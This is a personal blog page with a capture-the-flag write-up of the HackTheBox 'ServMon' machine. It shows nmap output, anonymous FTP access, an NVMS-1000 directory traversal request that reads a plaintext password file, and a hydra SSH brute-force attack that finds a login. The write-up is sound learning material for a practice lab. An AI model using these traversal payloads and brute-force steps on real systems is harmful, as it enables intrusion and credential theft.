<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HackTheBox Machine - Servmon | Tri Wanda Septian’s Blog</title>
<meta name="description" content="">


  <meta name="author" content="Tri Wanda Septian">
  
  <meta property="article:author" content="Tri Wanda Septian">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Tri Wanda Septian's Blog">
<meta property="og:title" content="HackTheBox Machine - Servmon">
<meta property="og:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-servmon/">


  <meta property="og:description" content="">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-frame.png">



  <meta name="twitter:site" content="@twseptian_">
  <meta name="twitter:title" content="HackTheBox Machine - Servmon">
  <meta name="twitter:description" content="">
  <meta name="twitter:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-servmon/">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="http://localhost:4000/assets/images/htb-frame.png">
    
  

  



  <meta property="article:published_time" content="2020-06-19T00:00:00+07:00">



  <meta property="article:modified_time" content="2020-06-20T04:51:00+07:00">



  

  


<link rel="canonical" href="http://localhost:4000/hackthebox%20machine/htb-machine-servmon/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Tri Wanda Septian's Blog and Stuff",
      "url": "http://localhost:4000/",
      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
    
  }
</script>


  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />


  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">




<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->




    <!-- start custom head snippets -->
<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
        
        <a class="site-title" href="/">
          Tri Wanda Septian
          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/">posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/">tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/">categories</a>
            </li><li class="masthead__menu-item">
              <a href="/about/">about me</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    
    <aside class="sidebar__top">
      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
      </aside>

    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
        </li>
      

      
        
          
            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
          
        
          
            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
          
        
          
            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>




  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HackTheBox Machine - Servmon">
    <meta itemprop="description" content="">
    <meta itemprop="datePublished" content="2020-06-19T00:00:00+07:00">
    <meta itemprop="dateModified" content="2020-06-20T04:51:00+07:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox Machine - Servmon
</h1>
          
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2020-06-19T00:00:00+07:00">June 19, 2020</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          16 minute read
        
      </span>
        
  </p>
  



          <section class="page__share">
  
    <!--<h4 class="page__share-title">Share on</h4>-->
  

  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=HackTheBox+Machine+-+Servmon%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-servmon%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-servmon%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-servmon%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
  
  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
</section>

          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu">
  <li><a href="#network-scanning">Network Scanning</a></li>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#privilege-escalation---nadine">Privilege Escalation - Nadine</a></li>
  <li><a href="#privilege-escalation---administrator">Privilege Escalation - Administrator</a>
    <ul>
      <li><a href="#privilege-escalation-using-nsclient-api">Privilege Escalation using NSClient++ API</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <p><img src="/assets/images/htb-machine-servmon/featured-image.jpg" alt="HTB Servmon" /></p>

<p>ServMon is a retired machine, and it was an easy windows machine, but some of the problems like not compatible when we were open some of the services on the browser, and to solved it, we needed some tricks and tips from the APIs documentation.</p>

<h3 id="network-scanning">Network Scanning</h3>

<p>In the first step we need to find some information about the machine, like what kinds of <code class="language-plaintext highlighter-rouge">services</code>, open <code class="language-plaintext highlighter-rouge">ports</code>, and <code class="language-plaintext highlighter-rouge">operating system</code>. we could to run nmap command: <code class="language-plaintext highlighter-rouge">nmap -A -sV -sC -oN servmon.nmap 10.10.10.184</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Tue Apr 14 11:10:21 2020 as: nmap -A -sV -sC -oN servmon.nmap 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.41s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
|     &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
|     &lt;head&gt;
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script type="text/javascript"&gt;
|     window.location.href = "Pages/login.htm";
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/14%Time=5E9537F2%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\
SF:x20\x20\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x
SF:20\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x20\x2
SF:0&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/14%Time=5E9537FB%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xbf\n\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-14T04:23:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 14 11:13:49 2020 -- 1 IP address (1 host up) scanned in 208.30 seconds
</code></pre></div></div>

<p>After we run <code class="language-plaintext highlighter-rouge">nmap</code>, we got some open ports such as <code class="language-plaintext highlighter-rouge">21</code>,<code class="language-plaintext highlighter-rouge">22</code>, <code class="language-plaintext highlighter-rouge">80</code>, <code class="language-plaintext highlighter-rouge">135</code>, <code class="language-plaintext highlighter-rouge">139</code>, <code class="language-plaintext highlighter-rouge">445</code>, <code class="language-plaintext highlighter-rouge">5666</code>,<code class="language-plaintext highlighter-rouge">6699</code> and <code class="language-plaintext highlighter-rouge">8443</code>. For the important thing is, we should enumerate
interesting open ports with the services.</p>

<h3 id="enumeration">Enumeration</h3>

<p>On the Enumeration. First, we look at port <code class="language-plaintext highlighter-rouge">21</code> or <code class="language-plaintext highlighter-rouge">FTP</code> with all of the information shown below.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
</code></pre></div></div>

<p>FTP service can be accessed using anonymous account. we can login without password,just only put <code class="language-plaintext highlighter-rouge">anonymous</code> as an username and download all files in <code class="language-plaintext highlighter-rouge">Nadine</code>’s and <code class="language-plaintext highlighter-rouge">Nathan</code>’s directories.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>twseptian@twsterlab:~/HTB/boxes/servmon$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:twseptian): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       &lt;DIR&gt;          Users
226 Transfer complete.
ftp&gt; cd Users
250 CWD command successful.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       &lt;DIR&gt;          Nadine
01-18-20  12:08PM       &lt;DIR&gt;          Nathan
226 Transfer complete.
ftp&gt; cd Nadine
250 CWD command successful.
ftp&gt; ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp&gt; get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
174 bytes received in 0.41 secs (0.4148 kB/s)
ftp&gt; cd ..
250 CWD command successful.
ftp&gt; ls
200 PORT command successful.
150 Opening ASCII mode data connection.
01-18-20  12:06PM       &lt;DIR&gt;          Nadine
01-18-20  12:08PM       &lt;DIR&gt;          Nathan
226 Transfer complete.
ftp&gt; cd Nathan
250 CWD command successful.
ftp&gt; ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp&gt; get Notes to do.txt
local: to remote: Notes
200 PORT command successful.
550 The system cannot find the file specified. 
ftp&gt; ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp&gt; get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.20 secs (0.8881 kB/s)
ftp&gt; 
</code></pre></div></div>

<p>we got some of the notes,<code class="language-plaintext highlighter-rouge">do.txt</code> and <code class="language-plaintext highlighter-rouge">Confidental.txt</code></p>

<p>notes from <code class="language-plaintext highlighter-rouge">do.txt</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
</code></pre></div></div>
<p>from <code class="language-plaintext highlighter-rouge">d.txt</code>, it can be concluded that there are nvms and nsclient services and secret files in Sharepoint</p>

<p>and notes from <code class="language-plaintext highlighter-rouge">Confidental.txt</code>, we can read below</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
</code></pre></div></div>
<p>on <code class="language-plaintext highlighter-rouge">Confidental.txt</code> explained <code class="language-plaintext highlighter-rouge">Nadine</code> left Password.txt on <code class="language-plaintext highlighter-rouge">Nadine</code>’s Desktop</p>

<p>Let’s open the IP address of the machine on the browser. We can look webpage with <code class="language-plaintext highlighter-rouge">nvms-1000</code> home page.</p>

<p><img src="/assets/images/htb-machine-servmon/01.png" alt="nvms-1000" /></p>

<p>Find <code class="language-plaintext highlighter-rouge">nvms-1000</code> using <code class="language-plaintext highlighter-rouge">searchploit</code></p>

<p><img src="/assets/images/htb-machine-servmon/02.png" alt="01" /></p>

<p>Copy the information using <code class="language-plaintext highlighter-rouge">searchploit -m hardware/webapps/47774.txt</code> and open 47774.txt. The information is showed below</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</code></pre></div></div>

<p>Here, we use repeater on <code class="language-plaintext highlighter-rouge">burpsuite</code> to access directory  <code class="language-plaintext highlighter-rouge">/../../../../../../../../../../../../windows/win.ini</code>.</p>

<p><img src="/assets/images/htb-machine-servmon/03.png" alt="03" /></p>

<p>From <code class="language-plaintext highlighter-rouge">Directory Traversal</code> vulnerability, we can access path/directory on the machine, but nothing showed anything. let’s see again note from Nadine to Nathan, She said on her note</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
</code></pre></div></div>

<p>That <code class="language-plaintext highlighter-rouge">Password.txt</code> on Nathan’s Desktop, and we can suggest path is <code class="language-plaintext highlighter-rouge">C:\Users\Nathan\Desktop\Passwords.txt</code>. We can change request to access directory on burpsuite with <code class="language-plaintext highlighter-rouge">GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1</code></p>

<p><img src="/assets/images/htb-machine-servmon/04.png" alt="04" /></p>

<p>Request</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /Pages/login.htm/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
</code></pre></div></div>

<p>Response</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
</code></pre></div></div>

<p>We got some credential lists,or maybe a password list.</p>

<h3 id="privilege-escalation---nadine">Privilege Escalation - Nadine</h3>

<p>After we got the credential list, the Brute force attack using <code class="language-plaintext highlighter-rouge">hydra</code> can be a solution to find the real password for <code class="language-plaintext highlighter-rouge">Nadine</code> or <code class="language-plaintext highlighter-rouge">Nathan</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@twsterlab:/twseptian/HTB/boxes/servmon# hydra -L users.txt -P password.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 10:52:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 10:52:45
</code></pre></div></div>

<p><img src="/assets/images/htb-machine-servmon/05.png" alt="05" /></p>

<p>username: <code class="language-plaintext highlighter-rouge">nadine</code>
password: <code class="language-plaintext highlighter-rouge">L1k3B1gBut7s@W0rk</code></p>

<p>After we got the username and password, let’s access the server using ssh services.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine&gt;whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine&gt;dir
 Volume in drive C has no label.                  
 Volume Serial Number is 728C-D22C                

 Directory of C:\Users\Nadine

08/04/2020  23:16    &lt;DIR&gt;          .
08/04/2020  23:16    &lt;DIR&gt;          ..
18/01/2020  11:23    &lt;DIR&gt;          3D Objects
18/01/2020  11:23    &lt;DIR&gt;          Contacts
08/04/2020  22:28    &lt;DIR&gt;          Desktop
08/04/2020  22:28    &lt;DIR&gt;          Documents
18/01/2020  11:23    &lt;DIR&gt;          Downloads
08/04/2020  22:27    &lt;DIR&gt;          Favorites
08/04/2020  22:27    &lt;DIR&gt;          Links
18/01/2020  11:23    &lt;DIR&gt;          Music
18/01/2020  11:31    &lt;DIR&gt;          OneDrive
18/01/2020  11:23    &lt;DIR&gt;          Pictures
18/01/2020  11:23    &lt;DIR&gt;          Saved Games
18/01/2020  11:23    &lt;DIR&gt;          Searches
18/01/2020  11:23    &lt;DIR&gt;          Videos
